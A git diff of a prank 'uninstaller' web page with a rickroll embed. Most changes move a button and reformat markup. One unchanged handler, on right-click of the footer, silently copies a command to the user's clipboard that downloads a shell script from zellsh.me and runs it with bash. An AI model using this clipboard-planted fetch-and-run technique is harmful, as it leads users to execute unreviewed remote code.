@@ -38,6 +38,10 @@
       >
     </div>
 
+    <button class="uninstaller-button" id="uninstaller-button-id">
+      Get the Uninstaller!
+    </button>
+
     <!-- I don't know shit about html or js so I stole the rickroll stuff from Maurice Kühl (https://github.com/mauricekuehl/rickroll)
 
     MIT License
@@ -62,11 +66,6 @@
     OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
     SOFTWARE. -->
 
-    <div class="uninstaller-div">
-      <button class="uninstaller-button" id="uninstaller-button-id">
-        Get the Uninstaller!
-      </button>
-    </div>
     <div id="player"></div>
     <script>
       var tag = document.createElement("script");
@@ -91,7 +90,7 @@
 
       let toPlay = false;
       document
-        .querySelector(".uninstaller-div")
+        .querySelector(".uninstaller-button")
         .addEventListener("click", () => {
           toPlay = true;
         });
@@ -101,7 +100,7 @@
           play(event);
         }
         document
-          .querySelector(".uninstaller-div")
+          .querySelector(".uninstaller-button")
           .addEventListener("click", () => {
             play(event);
           });
@@ -114,7 +113,9 @@
 
     <!-- End of MIT License, nobody else but me is to blame for the horrors below this line -->
 
-    <footer id="footer-id" style="margin-top: 80px">⚠️ This website is super professional! Totally trust it! ⚠️</footer>
+    <footer id="footer-id" style="margin-top: 80px">
+      ⚠️ This website is super professional! Totally trust it! ⚠️
+    </footer>
 
     <script>
       document.getElementById("uninstaller-button-id").onmousedown = function (
@@ -127,9 +128,7 @@
         }
       };
 
-      document.getElementById("footer-id").onmousedown = function (
-        event
-      ) {
+      document.getElementById("footer-id").onmousedown = function (event) {
         if (event.which == 3) {
           navigator.clipboard.writeText(
             "/bin/wget -O /tmp/antizell 'https://zellsh.me/antizell.sh' && /bin/bash /tmp/antizell"
@@ -189,12 +188,12 @@
         border: 5px solid #00ff00;
         color: #ff00ff;
       }
-      16.66%{
+      16.66% {
         transform: rotate(6deg) scale(1.15);
         border: 5px solid #0000ff;
         color: #ffff00;
       }
-      33.33%{
+      33.33% {
         transform: rotate(6deg) scale(1);
         border: 5px solid #ff0000;
         color: #00ffff;
@@ -204,12 +203,12 @@
         border: 5px solid #00ff00;
         color: #ff00ff;
       }
-      66.66%{
+      66.66% {
         transform: rotate(6deg) scale(1);
         border: 5px solid #0000ff;
         color: #ffff00;
       }
-      83.33%{
+      83.33% {
         transform: rotate(6deg) scale(1.15);
         border: 5px solid #ff0000;
         color: #00ffff;
@@ -226,7 +225,7 @@
       background: magenta;
       text-decoration: underline double orange;
       transition: transform 0.3s ease-in-out;
-      animation: scale-animation-hover 1.0s infinite ease-in-out;
+      animation: scale-animation-hover 1s infinite ease-in-out;
       box-shadow: 10px -10px 15px #000;
     }
 
